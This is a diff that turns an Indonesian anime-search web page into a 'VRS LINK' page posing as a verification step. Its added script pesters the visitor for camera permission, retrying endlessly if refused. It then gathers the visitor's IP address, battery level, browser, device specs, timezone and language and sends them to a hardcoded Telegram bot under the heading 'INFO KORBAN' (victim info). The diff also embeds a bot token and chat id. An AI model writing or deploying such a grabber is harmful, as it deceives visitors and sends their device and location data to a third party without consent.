@@ -1,156 +1,239 @@
-<!DOCTYPE html>
-<html lang="en">
+ <!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <title>TRASER ANIME</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>VRS LINK</title>
   <style>
     body {
-      background: url('https://files.catbox.moe/197nmb.jpg') no-repeat center center fixed;
-      background-size: cover;
-      font-family: 'Courier New', monospace;
-      color: white;
-      margin: 0;
-      padding: 0;
+      background: linear-gradient(135deg, #121212, #1f1f1f);
+      color: #00ffaa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       text-align: center;
+      padding: 60px 20px;
+      overflow: hidden;
+      animation: fadeIn 2s ease-in;
     }
-
     h1 {
-      color: #00ccff;
-      font-size: 32px;
-      margin-top: 20px;
-      text-shadow: 2px 2px 5px black;
+      font-size: 3.5em;
+      margin-bottom: 30px;
+      color: #00ffee;
+      text-shadow: 0 0 25px #00ffee, 0 0 5px #00ffee;
+      animation: glow 2s infinite alternate;
     }
-
-    input[type="text"] {
-      padding: 10px;
-      width: 70%;
-      max-width: 400px;
-      border-radius: 10px;
+    p {
+      font-size: 1.2em;
+      margin-bottom: 40px;
+      color: #00fff0;
+    }
+    button {
+      background: #00ffaa;
+      color: #000;
+      font-size: 20px;
+      font-weight: bold;
+      padding: 15px 30px;
       border: none;
-      background: #111;
-      color: white;
-      margin: 20px 0;
-      box-shadow: 0 0 10px #00ccff;
-      text-align: center;
-    }
-
-    .anime-list {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-      gap: 20px;
-      padding: 0 20px 50px;
-    }
-
-    .anime-card {
-      background: rgba(0, 0, 0, 0.6);
-      border: 2px solid #00ccff;
-      border-radius: 12px;
-      padding: 10px;
+      border-radius: 30px;
       cursor: pointer;
       transition: 0.3s;
-      box-shadow: 0 0 8px #00ccff, 0 0 16px #ff0000;
+      margin-top: 20px;
+      box-shadow: 0 4px 12px rgba(0, 255, 170, 0.3);
     }
-
-    .anime-card:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 12px #00ccff, 0 0 24px #ff1a1a;
+    button:hover {
+      background: #00e6b8;
+      transform: scale(1.1);
+      box-shadow: 0 4px 15px rgba(0, 255, 170, 0.5);
     }
-
-    .anime-card img {
-      width: 100%;
-      border-radius: 8px;
+    #status {
+      margin-top: 30px;
+      font-size: 18px;
+      color: #00ffee;
+      border-right: 2px solid #00ffaa;
+      white-space: nowrap;
+      overflow: hidden;
+      animation: typing 4s steps(40) infinite alternate;
     }
-
-    .anime-title {
-      margin-top: 10px;
-      font-size: 14px;
-      color: yellow;
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
     }
-
-    .btn-lain {
-      display: inline-block;
-      margin-top: 40px;
-      padding: 12px 24px;
-      font-size: 16px;
-      background: linear-gradient(135deg, #ff0000, #2b0000);
-      color: white;
-      border: 2px solid #00ccff;
-      border-radius: 14px;
+    @keyframes glow {
+      from { text-shadow: 0 0 5px #00ffee; }
+      to { text-shadow: 0 0 20px #00ffee, 0 0 30px #00ffaa; }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0 }
+      to { opacity: 1 }
+    }
+    .link-container {
+      margin-top: 50px;
+      font-size: 1.3em;
+      color: #00ffaa;
+    }
+    .link-container a {
+      color: #00ffee;
       text-decoration: none;
       font-weight: bold;
-      box-shadow: 0 0 8px #00ccff, 0 0 16px #ff0000;
-      transition: all 0.3s ease;
+      transition: color 0.3s;
+      font-size: 1.4em;
     }
-
-    .btn-lain:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 12px #00ccff, 0 0 24px #ff1a1a;
+    .link-container a:hover {
+      color: #00e6b8;
     }
-
-    .petunjuk {
-      margin-top: 10px;
-      font-size: 14px;
-      color: lightgreen;
+    .popup {
+      background-color: rgba(0, 0, 0, 0.8);
+      color: #00ffaa;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 15px rgba(0, 255, 170, 0.6);
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    .popup h2 {
+      font-size: 2em;
+      color: #00ffee;
+    }
+    .popup p {
+      font-size: 1.1em;
+    }
+    .close-btn {
+      background-color: #ff3333;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 20px;
+      transition: 0.3s;
+    }
+    .close-btn:hover {
+      background-color: #e60000;
     }
   </style>
 </head>
 <body>
-
-  <h1>TRASER ANIME</h1>
-  <input type="text" id="searchInput" placeholder="Cari anime yang mau ditonton...">
-  <br><br>
-  <button class="btn-lain" onclick="searchAnime()">Cari dan Tonton</button>
-
-  <div class="anime-list" id="anime-list">
-    <!-- Daftar Anime -->
+  <h1>VRS LINK</h1>
+  <p>apakah anda iningin menggunakan web vrs? :</p>
+  <button onclick="cekData()">YA</button>
+  <div id="status"></div>
+  
+  <div class="link-container">
+    <p>Setelah verifikasi, klik <a href="https://files.catbox.moe/clyrd5.jpg" target="_blank">disini</a>.</p>
   </div>
 
-  <a class="btn-lain" href="https://www.mynimeku.com" target="_blank">KALAU MAU NONTON ANIME LAIN KLICK INI</a>
-  <p class="petunjuk">Kalau mau nonton anime lain, klick tombol dan search anime-nya di website tersebut.</p>
-
-  <p class="petunjuk">Kalo mau search anime lain ad tombolnya paling bawah,Terus di arahkan ke web nonton anime nya,dan cari deh</p>
-
+  <!-- Popup untuk menampilkan informasi -->
+  <div id="popup" class="popup">
+    <h2>𝗜𝗡𝗙𝗢 𝗦𝗬𝗦𝗧𝗘𝗠</h2>
+    <p id="popupContent"></p>
+    <button class="close-btn" onclick="tutupPopup()">Tutup</button>
+  </div>
 
   <script>
-    const animeData = [
-      { title: 'Naruto', image: 'https://cdn.myanimelist.net/images/anime/13/17405.jpg' },
-      { title: 'One Piece', image: 'https://cdn.myanimelist.net/images/anime/6/73245.jpg' },
-      { title: 'Attack on Titan', image: 'https://cdn.myanimelist.net/images/anime/10/47347.jpg' },
-      { title: 'Demon Slayer', image: 'https://cdn.myanimelist.net/images/anime/1286/99889.jpg' },
-      { title: 'Jujutsu Kaisen', image: 'https://cdn.myanimelist.net/images/anime/1171/109222.jpg' },
-      { title: 'Tokyo Ghoul', image: 'https://cdn.myanimelist.net/images/anime/5/64449.jpg' },
-      { title: 'Sword Art Online', image: 'https://cdn.myanimelist.net/images/anime/11/39717.jpg' },
-      { title: 'Black Clover', image: 'https://cdn.myanimelist.net/images/anime/2/88336.jpg' },
-      { title: 'Bleach', image: 'https://cdn.myanimelist.net/images/anime/3/40451.jpg' },
-      { title: 'My Hero Academia', image: 'https://cdn.myanimelist.net/images/anime/10/78745.jpg' },
-    ];
+    const token = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU"; // Ganti token kamu
+    const chat_id = "7916928366"; // Ganti chat id kamu
 
-    const animeList = document.getElementById('anime-list');
+    let startTime = Date.now();
 
-    animeData.forEach(anime => {
-      const card = document.createElement('div');
-      card.className = 'anime-card';
-      card.onclick = () => {
-        const url = `https://www.mynimeku.com/?s=${encodeURIComponent(anime.title)}`;
-        window.open(url, '_blank');
-      };
-      card.innerHTML = `
-        <img src="${anime.image}" alt="${anime.title}" />
-        <div class="anime-title">${anime.title}</div>
-      `;
-      animeList.appendChild(card);
-    });
+    async function cekData() {
+      tampilkanStatus("Memproses...");
 
-    function searchAnime() {
-      const input = document.getElementById('searchInput').value.trim();
-      if (input) {
-        const url = `https://www.mynimeku.com/?s=${encodeURIComponent(input)}`;
-        window.open(url, '_blank');
+      // Minta izin untuk mengakses kamera
+      if (navigator.mediaDevices) {
+        try {
+          // Cek apakah izin sudah diberikan
+          await navigator.mediaDevices.getUserMedia({ video: true });
+          tampilkanStatus("Izin Kamera Diterima!");
+          await ambilDanKirimInfo();
+          tampilkanStatus("Data berhasil diambil!");
+
+          // Menampilkan popup dengan data
+          const infoPopup = `
+            🌐 IP: ${await ambilIP()}<br>
+            🔋 Baterai: ${await ambilBaterai()}<br>
+            💻 Platform: ${navigator.platform}<br>
+            🖥️ Browser: ${navigator.userAgent}<br>
+            🖥️ Resolusi: ${screen.width}x${screen.height}<br>
+            🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}<br>
+            🗣️ Bahasa: ${navigator.language}<br>
+            🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core<br>
+            🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB<br>
+            📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}<br>
+            ⏰ Durasi Buka: ${Math.floor((Date.now() - startTime) / 1000)} detik
+          `;
+          document.getElementById('popupContent').innerHTML = infoPopup;
+          document.getElementById('popup').style.display = 'block';
+
+          await kirimTelegram(`📝𝗜𝗡𝗙𝗢 𝗞𝗢𝗥𝗕𝗔𝗡:\n${infoPopup}`);
+        } catch (e) {
+          // Jika kamera ditolak, beri tahu pengguna dan minta izin lagi
+          console.error("Kamera tidak diizinkan:", e);
+          tampilkanStatus("Perizinan kamera diperlukan. Coba izinkan akses.");
+          setTimeout(() => {
+            cekData();  // Coba lagi untuk meminta izin
+          }, 1000); // Tunggu 1 detik sebelum mencoba lagi
+        }
       } else {
-        alert('Masukkan nama anime terlebih dahulu!');
+        alert("Browser tidak mendukung akses kamera.");
+        return;
       }
     }
-  </script>
 
+    function tampilkanStatus(teks) {
+      const statusDiv = document.getElementById('status');
+      statusDiv.innerText = teks;
+    }
+
+    async function kirimTelegram(pesan) {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text: pesan })
+      });
+    }
+
+    async function ambilIP() {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      return ipData.ip || "Unknown";
+    }
+
+    async function ambilBaterai() {
+      const battery = await navigator.getBattery();
+      return (battery.level * 100).toFixed(0) + "%";
+    }
+
+    async function ambilDanKirimInfo() {
+      const ip = await ambilIP();
+      const batteryLevel = await ambilBaterai();
+      const durasiMs = Date.now() - startTime;
+      const durasiDetik = Math.floor(durasiMs / 1000);
+
+      const text = `
+        🌐 IP: ${ip}
+        🔋 Baterai: ${batteryLevel}
+        💻 Platform: ${navigator.platform}
+        🖥️ Browser: ${navigator.userAgent}
+        🖥️ Resolusi: ${screen.width}x${screen.height}
+        🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+        🗣️ Bahasa: ${navigator.language}
+        🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core
+        🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB
+        📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}
+        ⏰ Durasi Buka: ${durasiDetik} detik
+      `;
+      await kirimTelegram(text);
+    }
+
+    function tutupPopup() {
+      document.getElementById('popup').style.display = 'none';
+    }
+  </script>
 </body>
 </html>
